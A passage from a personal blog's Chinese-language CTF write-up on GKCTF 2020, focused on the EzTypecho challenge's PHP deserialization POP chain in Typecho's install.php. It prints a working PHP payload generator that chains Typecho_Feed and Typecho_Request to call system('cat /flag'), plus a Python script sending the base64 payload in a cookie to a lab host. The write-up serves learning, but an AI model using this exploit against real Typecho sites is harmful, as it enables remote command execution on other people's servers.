+<p>其实刚分析完整个流程，看这个exp，我还是有点懵的。一个点：怎么就能关联到__toString()方法了呢？搞得我还以为魔术方法是全局触发的呢。其实并不是，变量adapter是Typecho_Feed()，这样就能被当字符串处理就能触发__toString()，是因为__toString()函数是属于Typecho_Feed()的，所以能触发。可能很蠢，但我刚开始就这样想了，这可能是很长时间没做这种题目的原因。分析完POP链，也还是要花点时间去看看这个exp是怎么写的，不然对PHP反序列化这个知识点还是不够深入的。</p>
+<p>最后想拿flag的时候，要加上PHP_SESSION_UPLOAD_PROGRESS名字的文件，还有PHPSESSID。但在尝试时，发现我不会用burp上传文件，postman还没玩熟，就各种不行。目标效果是下面这样，但就是实现不了。就换成py脚本来请求和提交数据。</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200526220923.png"></p>
+<p>用脚本的时候也发现一个有问题，上面的exp生成的payload能显示phpinfo，但是想cat /flag就会出错，没有回显。换用官方exp，生成的payload去cat /flag就么有问题，也搞不清楚为什么。官方exp如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;\?php</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span>&#123;</span><br><span class="line">	<span class="comment">//const RSS2 = &#x27;RSS 2.0&#x27;; </span></span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$_type</span>;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$_items</span> = <span class="keyword">array</span>(); </span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="comment">//不加就会出现database error500</span></span><br><span class="line">		<span class="keyword">$this</span>-&gt;_type = <span class="string">&#x27;RSS 2.0&#x27;</span>;</span><br><span class="line">		<span class="variable">$item</span>[<span class="string">&#x27;author&#x27;</span>] = <span class="keyword">new</span> Typecho_Request(); </span><br><span class="line">		<span class="variable">$item</span>[<span class="string">&#x27;category&#x27;</span>] = <span class="keyword">array</span>(<span class="keyword">new</span> Typecho_Request()); </span><br><span class="line">		<span class="keyword">$this</span>-&gt;_items[<span class="number">0</span>] = <span class="variable">$item</span>;</span><br><span class="line">	&#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$_params</span> = <span class="keyword">array</span>(); </span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$_filter</span> = <span class="keyword">array</span>(); </span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;_params[<span class="string">&quot;screenName&quot;</span>]=<span class="string">&quot;cat /flag&quot;</span>;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;_filter[<span class="number">0</span>]=<span class="string">&quot;system&quot;</span>; </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">	</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(<span class="string">&quot;adapter&quot;</span> =&gt; <span class="keyword">new</span> Typecho_Feed(),<span class="string">&quot;prefix&quot;</span> =&gt; <span class="string">&quot;test&quot;</span>); </span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>下面是用官方的py脚本，会写脚本是真方便，省得来回操作工具。脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests </span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://614f305f-9b66-495a-93bd-805339272911.node3.buuoj.cn/install.php?finish=1&#x27;</span> </span><br><span class="line">files=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="number">123</span>&#125;</span><br><span class="line">headers=&#123; <span class="comment">#__typecho_config要用前面exp生成的payload替换             </span></span><br><span class="line"><span class="string">&#x27;cookie&#x27;</span>:<span class="string">&#x27;PHPSESSID=test;__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YToyOntzOjY6ImF1dGhvciI7TzoxNToiVHlwZWNob19SZXF1ZXN0IjoyOntzOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9wYXJhbXMiO2E6MTp7czoxMDoic2NyZWVuTmFtZSI7czo5OiJjYXQgL2ZsYWciO31zOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9maWx0ZXIiO2E6MTp7aTowO3M6Njoic3lzdGVtIjt9fXM6ODoiY2F0ZWdvcnkiO2E6MTp7aTowO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6OToiY2F0IC9mbGFnIjt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfZmlsdGVyIjthOjE6e2k6MDtzOjY6InN5c3RlbSI7fX19fX19czo2OiJwcmVmaXgiO3M6NDoidGVzdCI7fQ==&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Referer&#x27;</span>:<span class="string">&#x27;http://614f305f-9b66-495a-93bd-805339272911.node3.buuoj.cn/install.php&#x27;</span></span><br><span class="line">&#125; </span><br><span class="line">res=requests.post(url,files=files,headers=headers,data= &#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: <span class="string">&quot;123456789&quot;</span>&#125;) </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>
+
+<p>执行就能得到flag。</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200526224440.png"></p>
+<p>在看别人博客的时候，还发现另一种方法，是在url的install.php后面get传参start=1，这样就能绕过session没开启的限制，不用加PHPSESSID，也不用加PHP_SESSION_UPLOAD_PROGRESS。</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200526224822.png"></p>
+<p>在博客下面留言，得到回复：不是同一段代码，不是绕sesion_start()；加上start是进一个新的if，在那个if里有另一个反序列化位点；代码里有2处反序列化位点，第一处需要session，但是没session所以用不了，用另一个。虽说入口点不一样，但是反序列化链都是一样的。</p>
+<p>下面就是根据提示，在install.php找到的另一个入口点。因为不传finish参数，前面就exit。然后看到这里，我们get传参start，进入这个if分支。进入后，又有一个if来判断是否存在那个配置文件，因为我们没安装，自然没那个文件。然后进入下面那个else分支，就又看到了上面熟悉的反序列化语句，而且后面也有写入Typecho_Db对象，所以说反序列化链和exp都是一样的。</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200527204045.png"></p>
+<p>如果这样下来发现POP链分析还是比较可以的，能跟着整个流程走下来。但可能是因为跟着别人的步子走，才能这么顺，要是纯粹自己分析可能又是另一种情况，以后也要找这种漏洞多分析分析。</p>
+<h2 id="Node-Exe"><a href="#Node-Exe" class="headerlink" title="Node-Exe"></a>Node-Exe</h2><p>这道题目先放放，今天是没时间了，也有新知识。</p>
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><!--做这些题目，整了快一天，虽然花的时间久，但也丝毫没有急躁，这次也算是沉浸了，心无杂念。虽然我当时没做出来东西，但这次的复现，还是学到了挺多的东西，有很多东西没听过，现在知道了，也能更深入地学习。还有些简单题目，自己把它看复杂了，从一开始就没做出来的信心，又怎么能够做出来。往后的ctf，还是要静心凝神，专注思考，才能做出来一些东西。现在，我又再次感受到web的魅力，往后就只做web，什么misc和crypto就不做了，毕竟精力就那么多，时间也有限。现在真正想参加ctf的我，不求名，不求利，只求能学到一些东西，以期在web这条路上能更加精进。长路漫漫，还得继续努力。-->
+
+<blockquote>
+<p>参考：</p>
+<p>[1] <a target="_blank" rel="noopener" href="https://www.gem-love.com/ctf/2361.html">防灾科技学院GKCTF 2020 Writeup</a></p>
+<p>[2] <a target="_blank" rel="noopener" href="http://ha1c9on.top/2020/05/24/gkctf2020web-write-up/#GKCTF2020EZ-EzNode">[GKCTF2020]Web 部分</a></p>
+<p>[3] <a target="_blank" rel="noopener" href="http://phoebe233.cn/index.php/archives/43/">GKCTF-ezweb</a></p>
+<p>[4] <a target="_blank" rel="noopener" href="https://www.bycsec.top/2020/05/24/GKCTF2020writeup/">GKCTF2020wp</a></p>
+<p>[5] <a target="_blank" rel="noopener" href="https://byqiyou.github.io/2019/07/15/%E6%B5%85%E6%9E%90Redis%E4%B8%ADSSRF%E7%9A%84%E5%88%A9%E7%94%A8/">浅析Redis中SSRF的利用</a></p>
+</blockquote>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Check-in"><span class="toc-number">1.1.</span> <span class="toc-text">Check_in</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%80%81%E5%85%AB%E5%B0%8F%E8%B6%85%E5%B8%82%E5%84%BF"><span class="toc-number">1.2.</span> <span class="toc-text">老八小超市儿</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE%E7%AD%BE%E5%88%B0"><span class="toc-number">1.3.</span> <span class="toc-text">CVE签到</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EzNode"><span class="toc-number">1.4.</span> <span class="toc-text">EzNode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EzWeb"><span class="toc-number">1.5.</span> <span class="toc-text">EzWeb</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EzTypecho"><span class="toc-number">1.6.</span> <span class="toc-text">EzTypecho</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Node-Exe"><span class="toc-number">1.7.</span> <span class="toc-text">Node-Exe</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E8%AE%B0"><span class="toc-number">1.8.</span> <span class="toc-text">后记</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://crownz-sec.github.io/2020/05/26/GKCTF2020/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://crownz-sec.github.io/2020/05/26/GKCTF2020/&text=GKCTF学习"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://crownz-sec.github.io/2020/05/26/GKCTF2020/&title=GKCTF学习"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://crownz-sec.github.io/2020/05/26/GKCTF2020/&is_video=false&description=GKCTF学习"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=GKCTF学习&body=Check out this article: https://crownz-sec.github.io/2020/05/26/GKCTF2020/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://crownz-sec.github.io/2020/05/26/GKCTF2020/&title=GKCTF学习"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://crownz-sec.github.io/2020/05/26/GKCTF2020/&title=GKCTF学习"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://crownz-sec.github.io/2020/05/26/GKCTF2020/&title=GKCTF学习"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://crownz-sec.github.io/2020/05/26/GKCTF2020/&title=GKCTF学习"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://crownz-sec.github.io/2020/05/26/GKCTF2020/&name=GKCTF学习&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://crownz-sec.github.io/2020/05/26/GKCTF2020/&t=GKCTF学习"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020-2022
+    crownZ
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'crownZz';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
